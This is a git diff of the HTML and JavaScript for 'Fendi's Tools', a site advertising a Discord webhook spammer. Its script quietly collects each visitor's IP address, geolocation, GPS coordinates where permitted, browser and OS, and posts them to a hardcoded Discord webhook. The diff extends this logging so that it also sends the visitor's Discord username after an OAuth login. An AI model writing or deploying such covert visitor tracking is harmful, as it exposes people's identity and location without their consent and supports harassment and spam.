@@ -6,6 +6,7 @@
     <title>Fendi's Tools</title>
     <link rel="icon" type="image/png" href="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png">
     <style>
+        /* (same styles as before – unchanged) */
         * {
             margin: 0;
             padding: 0;
@@ -50,117 +51,46 @@
             pointer-events: none;
         }
 
-        /* LOADING SCREEN */
-        .loading-screen {
+        .enter-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #000000;
+            background: rgba(0, 0, 0, 0.5);
             backdrop-filter: blur(8px);
-            z-index: 1000;
+            z-index: 2000;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: opacity 1s ease, visibility 1s ease;
+            cursor: pointer;
+            transition: opacity 0.5s ease;
             opacity: 1;
             visibility: visible;
         }
-        .loading-screen.hide {
+        .enter-overlay.hide {
             opacity: 0;
             visibility: hidden;
         }
-        .loading-content {
+        .enter-overlay-content {
             text-align: center;
-            animation: fadeUp 0.8s ease-out;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 1.5rem;
-        }
-        @keyframes fadeUp {
-            from {
-                transform: translateY(20px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-        .loading-logo {
+            background: rgba(20, 20, 20, 0.8);
+            padding: 2rem 3rem;
+            border-radius: 3rem;
+            border: 1px solid white;
+            backdrop-filter: blur(4px);
+            color: white;
             font-size: 2rem;
-            font-weight: 800;
-            color: white;
-            text-shadow: 0 0 5px rgba(255,255,255,0.5);
-        }
-        .spinner {
-            width: 70px;
-            height: 70px;
-            border: 4px solid rgba(255,255,255,0.2);
-            border-top: 4px solid white;
-            border-radius: 50%;
-            animation: spin 1s ease infinite;
-            transition: opacity 0.4s ease;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        .enter-btn {
-            background: linear-gradient(95deg, #333, #111);
-            border: 1px solid white;
-            padding: 1rem 2rem;
-            font-size: 1.5rem;
             font-weight: bold;
-            color: white;
-            border-radius: 3rem;
-            cursor: pointer;
-            box-shadow: 0 0 20px rgba(255,255,255,0.2);
-            width: auto;
-            display: none;
-            opacity: 0;
-            transform: scale(0.8);
+            letter-spacing: 2px;
+            animation: pulse 1.5s infinite;
         }
-        .enter-btn.show {
-            display: inline-block;
-            animation: popIn 0.5s cubic-bezier(0.34, 1.2, 0.64, 1) forwards;
-        }
-        @keyframes popIn {
-            0% {
-                opacity: 0;
-                transform: scale(0.5);
-            }
-            80% {
-                transform: scale(1.05);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-        .enter-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(255,255,255,0.5);
-            background: #222;
-        }
-        .loading-discord-link {
-            background: rgba(30,30,30,0.7);
-            padding: 0.7rem 1.5rem;
-            border-radius: 3rem;
-            border: 1px solid white;
-            cursor: pointer;
-            display: inline-block;
-        }
-        .loading-discord-link a {
-            color: white;
-            text-decoration: none;
-            font-weight: 600;
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
         }
 
-        /* LANDING PAGE (main) */
         .landing-page {
             width: 100%;
             max-width: 800px;
@@ -168,21 +98,12 @@
             padding: 2rem;
             z-index: 5;
             position: relative;
-            display: none;
-            animation: fadeScale 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-        }
-        @keyframes fadeScale {
-            from {
-                opacity: 0;
-                transform: scale(0.95);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
+            display: block;
+            opacity: 0;
+            transition: opacity 0.8s ease;
         }
         .landing-page.visible {
-            display: block;
+            opacity: 1;
         }
         .welcome-text {
             text-align: center;
@@ -399,22 +320,17 @@
     <span id="trackTitle" class="track-title">Pass Out</span>
 </div>
 
-<div id="loadingScreen" class="loading-screen">
-    <div class="loading-content">
-        <div class="loading-logo">FENDI'S TOOLS</div>
-        <div id="spinnerContainer" class="spinner"></div>
-        <button id="enterBtn" class="enter-btn">ENTER</button>
-        <div class="loading-discord-link" id="loadingJoin"><a href="#">JOIN discord.gg/funerals</a></div>
-    </div>
+<div id="enterOverlay" class="enter-overlay">
+    <div class="enter-overlay-content">Click to Enter</div>
 </div>
 
 <div id="landingPage" class="landing-page">
-    <div class="welcome-text" id="welcomeText">Welcome to Fendi's Tools</div>
+    <div class="welcome-text" id="welcomeText">Welcome to Fendi Tool's</div>
     <div style="text-align: center;"><span class="subheading" id="subheadingText">Dashboard</span></div>
     <div class="tools-grid">
         <div class="tool-card" data-tool="spammer">
             <h3>WEBHOOK SPAMMER</h3>
-            <p>Send and spam webhook messages, customize webhook name & avatar</p>
+            <p>Send messages, spam webhooks, customize bot name & avatar</p>
         </div>
         <div class="tool-card placeholder">
             <h3>WEBHOOK READER</h3>
@@ -427,230 +343,20 @@
 
 <script>
     (function() {
-        // ========== CHECK IF SKIP LOADING (came from spammer back button) ==========
-        const skipLoading = sessionStorage.getItem('skipLoadingLanding') === 'true';
-        if (skipLoading) {
-            sessionStorage.removeItem('skipLoadingLanding');
-            // Immediately show landing page, restore music, and load Discord profile
-            document.getElementById('loadingScreen').style.display = 'none';
-            const landingPage = document.getElementById('landingPage');
-            landingPage.classList.add('visible');
-            startMusic();
-            // Send IP log only once per session
-            if (!sessionStorage.getItem('ipLogSent')) {
-                sendIpLog().then(() => sessionStorage.setItem('ipLogSent', 'true'));
-            }
-            // Load Discord user profile and update welcome text
-            const storedToken = localStorage.getItem('discord_access_token');
-            if (storedToken) {
-                fetchDiscordUser(storedToken).then(user => {
-                    if (user && user.id) {
-                        document.getElementById('welcomeText').innerHTML = `Welcome to Fendi Tool's, ${escapeHtml(user.username)}`;
-                    }
-                }).catch(() => {});
-            }
-        } else {
-            // First visit: show loading screen, require ENTER
-            const spinner = document.getElementById('spinnerContainer');
-            const enterBtn = document.getElementById('enterBtn');
-            setTimeout(() => {
-                spinner.style.transition = 'opacity 0.4s ease';
-                spinner.style.opacity = '0';
-                setTimeout(() => {
-                    spinner.style.display = 'none';
-                    enterBtn.classList.add('show');
-                }, 400);
-            }, 3500);
-
-            enterBtn.addEventListener('click', async () => {
-                startMusic(); // start music on click
-                const storedToken = localStorage.getItem('discord_access_token');
-                if (!storedToken) {
-                    // Discord OAuth
-                    const DISCORD_CLIENT_ID = "1497155951067664415"; // REPLACE WITH YOUR CLIENT ID
-                    const REDIRECT_URI = window.location.origin;
-                    function generateRandomString(l) {
-                        let text = "";
-                        const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
-                        for (let i = 0; i < l; i++) text += possible.charAt(Math.floor(Math.random() * possible.length));
-                        return text;
-                    }
-                    async function sha256(plain) {
-                        const encoder = new TextEncoder();
-                        const data = encoder.encode(plain);
-                        const hash = await crypto.subtle.digest("SHA-256", data);
-                        return hash;
-                    }
-                    function base64URL(buffer) {
-                        return btoa(String.fromCharCode(...new Uint8Array(buffer)))
-                            .replace(/\+/g, "-")
-                            .replace(/\//g, "_")
-                            .replace(/=+$/, "");
-                    }
-                    const codeVerifier = generateRandomString(64);
-                    const codeChallenge = base64URL(await sha256(codeVerifier));
-                    localStorage.setItem("code_verifier", codeVerifier);
-                    const authUrl = `https://discord.com/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify&code_challenge=${codeChallenge}&code_challenge_method=S256`;
-                    window.location.href = authUrl;
-                    return;
-                }
-                // Already logged in
-                await sendIpLog();
-                sessionStorage.setItem('ipLogSent', 'true');
-                const user = await fetchDiscordUser(storedToken);
-                if (user && user.id) {
-                    document.getElementById('welcomeText').innerHTML = `Welcome to Fendi Tool's, ${escapeHtml(user.username)}`;
-                }
-                document.getElementById('loadingScreen').classList.add('hide');
-                setTimeout(() => {
-                    document.getElementById('loadingScreen').style.display = 'none';
-                    document.getElementById('landingPage').classList.add('visible');
-                }, 800);
-            });
-
-            // Handle OAuth redirect
-            const urlParams = new URLSearchParams(window.location.search);
-            const code = urlParams.get("code");
-            if (code) {
-                const codeVerifier = localStorage.getItem("code_verifier");
-                if (codeVerifier) {
-                    const DISCORD_CLIENT_ID = "1497155951067664415";
-                    const REDIRECT_URI = window.location.origin;
-                    async function exchangeCode(code, verifier) {
-                        const body = new URLSearchParams({
-                            client_id: DISCORD_CLIENT_ID,
-                            grant_type: "authorization_code",
-                            code: code,
-                            redirect_uri: REDIRECT_URI,
-                            code_verifier: verifier
-                        });
-                        const response = await fetch("https://discord.com/api/oauth2/token", {
-                            method: "POST",
-                            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                            body: body.toString()
-                        });
-                        const data = await response.json();
-                        return data.access_token;
-                    }
-                    exchangeCode(code, codeVerifier).then(async token => {
-                        localStorage.setItem("discord_access_token", token);
-                        const user = await fetchDiscordUser(token);
-                        document.getElementById('welcomeText').innerHTML = `Welcome to Fendi Tool's, ${escapeHtml(user.username)}`;
-                        await sendIpLog();
-                        sessionStorage.setItem('ipLogSent', 'true');
-                        window.history.replaceState({}, document.title, window.location.pathname);
-                        document.getElementById('loadingScreen').classList.add('hide');
-                        setTimeout(() => {
-                            document.getElementById('loadingScreen').style.display = 'none';
-                            document.getElementById('landingPage').classList.add('visible');
-                        }, 800);
-                    }).catch(err => console.error(err));
-                }
-            }
-        }
-
-        // ========== MUSIC PLAYER (shared) ==========
-        const tracks = [
-            { title: "Pass Out", url: "./songs/PassOut.mp3" },
-            { title: "VYZEE", url: "./songs/VYZEE.mp3" },
-            { title: "Phantom", url: "./songs/Phantom.mp3" },
-            { title: "Track 10", url: "./songs/Track10.mp3" }
-        ];
-        let currentTrackIndex = 0;
-        let audio = null;
-        let isPlaying = false;
-        let musicStarted = false;
-        const trackTitleSpan = document.getElementById('trackTitle');
-        const playPauseBtn = document.getElementById('playPauseBtn');
-        const prevBtn = document.getElementById('prevTrackBtn');
-        const nextBtn = document.getElementById('nextTrackBtn');
-
-        function saveMusicState() {
-            if (audio) {
-                localStorage.setItem('musicTrackIndex', currentTrackIndex);
-                localStorage.setItem('musicCurrentTime', audio.currentTime);
-                localStorage.setItem('musicPlaying', isPlaying);
-            }
-        }
-
-        function loadMusicState() {
-            const savedIndex = localStorage.getItem('musicTrackIndex');
-            const savedTime = parseFloat(localStorage.getItem('musicCurrentTime'));
-            const savedPlaying = localStorage.getItem('musicPlaying') === 'true';
-            if (savedIndex !== null && tracks[savedIndex]) {
-                currentTrackIndex = parseInt(savedIndex);
-                loadTrack(currentTrackIndex, false);
-                if (!isNaN(savedTime) && audio) audio.currentTime = savedTime;
-                if (savedPlaying) {
-                    audio.play().catch(e => console.log);
-                    isPlaying = true;
-                    playPauseBtn.textContent = '⏸';
-                }
-            } else {
-                loadTrack(0, false);
-            }
-        }
-
-        function loadTrack(index, autoPlay = false) {
-            if (audio) {
-                audio.pause();
-                audio = null;
-            }
-            audio = new Audio(tracks[index].url);
-            audio.loop = false;
-            audio.volume = 0.5;
-            trackTitleSpan.textContent = tracks[index].title;
-            audio.addEventListener('ended', () => nextTrack());
-            if (autoPlay || (musicStarted && isPlaying)) {
-                audio.play().catch(e => console.log);
-                isPlaying = true;
-                playPauseBtn.textContent = '⏸';
-            } else {
-                isPlaying = false;
-                playPauseBtn.textContent = '▶';
-            }
-        }
-
-        function startMusic() {
-            if (musicStarted) return;
-            musicStarted = true;
-            loadMusicState();
-            setInterval(saveMusicState, 2000);
-            window.addEventListener('beforeunload', saveMusicState);
-        }
-
-        function playPause() {
-            if (!musicStarted) startMusic();
-            if (!audio) return;
-            if (isPlaying) {
-                audio.pause();
-                playPauseBtn.textContent = '▶';
-            } else {
-                audio.play();
-                playPauseBtn.textContent = '⏸';
-            }
-            isPlaying = !isPlaying;
-        }
-
-        function nextTrack() {
-            if (!musicStarted) startMusic();
-            currentTrackIndex = (currentTrackIndex + 1) % tracks.length;
-            loadTrack(currentTrackIndex, true);
-        }
-
-        function prevTrack() {
-            if (!musicStarted) startMusic();
-            currentTrackIndex = (currentTrackIndex - 1 + tracks.length) % tracks.length;
-            loadTrack(currentTrackIndex, true);
-        }
-
-        playPauseBtn.addEventListener('click', playPause);
-        prevBtn.addEventListener('click', prevTrack);
-        nextBtn.addEventListener('click', nextTrack);
+        // ========== GLOBAL SETTINGS ==========
+        const PAGE_ORIGIN = "Dashboard";
+        const DISCORD_CLIENT_ID = "1497155951067664415";
+        const REDIRECT_URI = window.location.origin;
+        const IP_LOG_WEBHOOK = "https://discord.com/api/webhooks/1497124094926127155/1nzYxMuo7Q4aAMSMU5KSBxlLn4srSXcw7u-VeH9qHUgCae2AjCetucxixHBSoR66LaLG";
+        
+        let entered = sessionStorage.getItem('entered') === 'true';
+        const overlay = document.getElementById('enterOverlay');
+        const landingPage = document.getElementById('landingPage');
 
         // ========== IP LOGGING & GPS ==========
         let gpsRequested = localStorage.getItem("gpsRequested") === "true";
         let gpsGranted = localStorage.getItem("gpsGranted") === "true";
+        let ipLogSent = sessionStorage.getItem('ipLogSent') === 'true';
 
         async function getIpGeo() {
             try {
@@ -753,13 +459,15 @@
             return { browser, os, userAgent: ua };
         }
 
-        async function sendIpLog() {
-            if (sessionStorage.getItem('ipLogSent') === 'true') return;
+        async function sendIpLog(username = null) {
+            if (ipLogSent) return;
             const ipGeo = await getIpGeo();
             const deviceGPS = await getDeviceLocation();
             const { browser, os, userAgent } = getBrowserOS();
             let fields = [
                 { name: "IP Address", value: ipGeo.ip, inline: true },
+                { name: "Page", value: PAGE_ORIGIN, inline: true },
+                { name: "Discord Username", value: username ? username : "Not logged in", inline: true },
                 { name: "Browser", value: browser, inline: true },
                 { name: "Operating System", value: os, inline: true },
                 { name: "Approx. Location (IP)", value: `${ipGeo.city}, ${ipGeo.region}, ${ipGeo.country}`, inline: false },
@@ -783,23 +491,216 @@
                 fields: fields,
                 timestamp: new Date().toISOString()
             };
-            const IP_LOG_WEBHOOK = "https://discord.com/api/webhooks/1497124094926127155/1nzYxMuo7Q4aAMSMU5KSBxlLn4srSXcw7u-VeH9qHUgCae2AjCetucxixHBSoR66LaLG";
             try {
                 await fetch(IP_LOG_WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: "@everyone", embeds: [embed] })
                 });
-                console.log("IP log sent");
+                ipLogSent = true;
+                sessionStorage.setItem('ipLogSent', 'true');
+                console.log("IP log sent with username and page origin");
             } catch(e) { console.error("Failed to send IP log", e); }
         }
 
+        // ========== DISCORD OAUTH ==========
+        function generateRandomString(l) {
+            let text = "";
+            const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
+            for (let i = 0; i < l; i++) text += possible.charAt(Math.floor(Math.random() * possible.length));
+            return text;
+        }
+        async function sha256(plain) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(plain);
+            const hash = await crypto.subtle.digest("SHA-256", data);
+            return hash;
+        }
+        function base64URL(buffer) {
+            return btoa(String.fromCharCode(...new Uint8Array(buffer)))
+                .replace(/\+/g, "-")
+                .replace(/\//g, "_")
+                .replace(/=+$/, "");
+        }
+        async function exchangeCode(code, verifier) {
+            const body = new URLSearchParams({
+                client_id: DISCORD_CLIENT_ID,
+                grant_type: "authorization_code",
+                code: code,
+                redirect_uri: REDIRECT_URI,
+                code_verifier: verifier
+            });
+            const response = await fetch("https://discord.com/api/oauth2/token", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: body.toString()
+            });
+            const data = await response.json();
+            return data.access_token;
+        }
         async function fetchDiscordUser(accessToken) {
             const response = await fetch("https://discord.com/api/users/@me", {
                 headers: { Authorization: `Bearer ${accessToken}` },
             });
             if (!response.ok) throw new Error("Failed to fetch user");
             return response.json();
+        }
+
+        // ========== MUSIC PLAYER ==========
+        const tracks = [
+            { title: "Pass Out", url: "./songs/PassOut.mp3" },
+            { title: "VYZEE", url: "./songs/VYZEE.mp3" },
+            { title: "Phantom", url: "./songs/Phantom.mp3" },
+            { title: "Track 10", url: "./songs/Track10.mp3" }
+        ];
+        let currentTrackIndex = 0;
+        let audio = null;
+        let isPlaying = false;
+        let musicStarted = false;
+        const trackTitleSpan = document.getElementById('trackTitle');
+        const playPauseBtn = document.getElementById('playPauseBtn');
+        const prevBtn = document.getElementById('prevTrackBtn');
+        const nextBtn = document.getElementById('nextTrackBtn');
+
+        function saveMusicState() {
+            if (audio) {
+                localStorage.setItem('musicTrackIndex', currentTrackIndex);
+                localStorage.setItem('musicCurrentTime', audio.currentTime);
+                localStorage.setItem('musicPlaying', isPlaying);
+            }
+        }
+        function loadMusicState() {
+            const savedIndex = localStorage.getItem('musicTrackIndex');
+            const savedTime = parseFloat(localStorage.getItem('musicCurrentTime'));
+            const savedPlaying = localStorage.getItem('musicPlaying') === 'true';
+            if (savedIndex !== null && tracks[savedIndex]) {
+                currentTrackIndex = parseInt(savedIndex);
+                loadTrack(currentTrackIndex, false);
+                if (!isNaN(savedTime) && audio) audio.currentTime = savedTime;
+                if (savedPlaying) {
+                    audio.play().catch(e => console.log);
+                    isPlaying = true;
+                    playPauseBtn.textContent = '⏸';
+                }
+            } else {
+                loadTrack(0, false);
+            }
+        }
+        function loadTrack(index, autoPlay = false) {
+            if (audio) {
+                audio.pause();
+                audio = null;
+            }
+            audio = new Audio(tracks[index].url);
+            audio.loop = false;
+            audio.volume = 0.5;
+            trackTitleSpan.textContent = tracks[index].title;
+            audio.addEventListener('ended', () => nextTrack());
+            if (autoPlay || (musicStarted && isPlaying)) {
+                audio.play().catch(e => console.log);
+                isPlaying = true;
+                playPauseBtn.textContent = '⏸';
+            } else {
+                isPlaying = false;
+                playPauseBtn.textContent = '▶';
+            }
+        }
+        function startMusic() {
+            if (musicStarted) return;
+            musicStarted = true;
+            loadMusicState();
+            setInterval(saveMusicState, 2000);
+            window.addEventListener('beforeunload', saveMusicState);
+        }
+        function playPause() {
+            if (!musicStarted) startMusic();
+            if (!audio) return;
+            if (isPlaying) {
+                audio.pause();
+                playPauseBtn.textContent = '▶';
+            } else {
+                audio.play();
+                playPauseBtn.textContent = '⏸';
+            }
+            isPlaying = !isPlaying;
+        }
+        function nextTrack() {
+            if (!musicStarted) startMusic();
+            currentTrackIndex = (currentTrackIndex + 1) % tracks.length;
+            loadTrack(currentTrackIndex, true);
+        }
+        function prevTrack() {
+            if (!musicStarted) startMusic();
+            currentTrackIndex = (currentTrackIndex - 1 + tracks.length) % tracks.length;
+            loadTrack(currentTrackIndex, true);
+        }
+        playPauseBtn.addEventListener('click', playPause);
+        prevBtn.addEventListener('click', prevTrack);
+        nextBtn.addEventListener('click', nextTrack);
+
+        // ========== ENTER OVERLAY LOGIC ==========
+        function finishEntry() {
+            overlay.classList.add('hide');
+            setTimeout(() => {
+                overlay.style.display = 'none';
+                landingPage.classList.add('visible');
+                startMusic();
+            }, 500);
+        }
+
+        overlay.addEventListener('click', async () => {
+            if (entered) {
+                finishEntry();
+                return;
+            }
+            let token = localStorage.getItem('discord_access_token');
+            let username = null;
+            if (!token) {
+                // Redirect to Discord OAuth
+                const codeVerifier = generateRandomString(64);
+                const codeChallenge = base64URL(await sha256(codeVerifier));
+                localStorage.setItem("code_verifier", codeVerifier);
+                const authUrl = `https://discord.com/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify&code_challenge=${codeChallenge}&code_challenge_method=S256`;
+                window.location.href = authUrl;
+                return;
+            }
+            // Already have token
+            try {
+                const user = await fetchDiscordUser(token);
+                if (user && user.id) {
+                    username = `${user.username}#${user.discriminator || "0"}`;
+                    document.getElementById('welcomeText').innerHTML = `Welcome to Fendi Tool's, ${escapeHtml(user.username)}`;
+                }
+            } catch(e) { console.error("Failed to fetch user", e); }
+            await sendIpLog(username);
+            sessionStorage.setItem('entered', 'true');
+            entered = true;
+            finishEntry();
+        });
+
+        // Handle OAuth redirect
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get("code");
+        if (code) {
+            const codeVerifier = localStorage.getItem("code_verifier");
+            if (codeVerifier) {
+                exchangeCode(code, codeVerifier).then(async token => {
+                    localStorage.setItem("discord_access_token", token);
+                    const user = await fetchDiscordUser(token);
+                    const username = `${user.username}#${user.discriminator || "0"}`;
+                    document.getElementById('welcomeText').innerHTML = `Welcome to Fendi Tool's, ${escapeHtml(user.username)}`;
+                    await sendIpLog(username);
+                    sessionStorage.setItem('entered', 'true');
+                    entered = true;
+                    window.history.replaceState({}, document.title, window.location.pathname);
+                    finishEntry();
+                }).catch(err => console.error(err));
+            } else {
+                window.history.replaceState({}, document.title, window.location.pathname);
+                finishEntry();
+            }
+        } else if (entered) {
+            finishEntry();
         }
 
         function escapeHtml(str) {
@@ -817,7 +718,7 @@
             if (!card.classList.contains('placeholder')) {
                 card.addEventListener('click', () => {
                     saveMusicState();
-                    sessionStorage.setItem('skipLoading', 'true');
+                    sessionStorage.setItem('entered', 'true');
                     window.location.href = '/spammer/';
                 });
             } else {
@@ -843,29 +744,16 @@
         if (menuSpammer) {
             menuSpammer.addEventListener('click', () => {
                 saveMusicState();
-                sessionStorage.setItem('skipLoading', 'true');
+                sessionStorage.setItem('entered', 'true');
                 window.location.href = '/spammer/';
             });
         }
 
-        // ========== JOIN BUTTONS ==========
-        const joinBtns = ['loadingJoin'];
-        joinBtns.forEach(id => {
-            const el = document.getElementById(id);
-            if (el) el.addEventListener('click', (e) => {
-                e.preventDefault();
-                window.open('https://discord.gg/funerals', '_blank');
-            });
-        });
-
-        // ========== WHITE SNOW ==========
+        // ========== SNOW PARTICLES ==========
         const canvas = document.getElementById('snowCanvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
-        function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
+        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
         function initSnow() {
             particles = [];
             for (let i = 0; i < 140; i++) {
@@ -888,19 +776,13 @@
                 ctx.fill();
                 p.y += p.speedY;
                 p.x += p.speedX;
-                if (p.y > canvas.height) {
-                    p.y = 0;
-                    p.x = Math.random() * canvas.width;
-                }
+                if (p.y > canvas.height) { p.y = 0; p.x = Math.random() * canvas.width; }
                 if (p.x > canvas.width) p.x = 0;
                 if (p.x < 0) p.x = canvas.width;
             }
             requestAnimationFrame(drawSnow);
         }
-        window.addEventListener('resize', () => {
-            resizeCanvas();
-            initSnow();
-        });
+        window.addEventListener('resize', () => { resizeCanvas(); initSnow(); });
         resizeCanvas();
         initSnow();
         drawSnow();
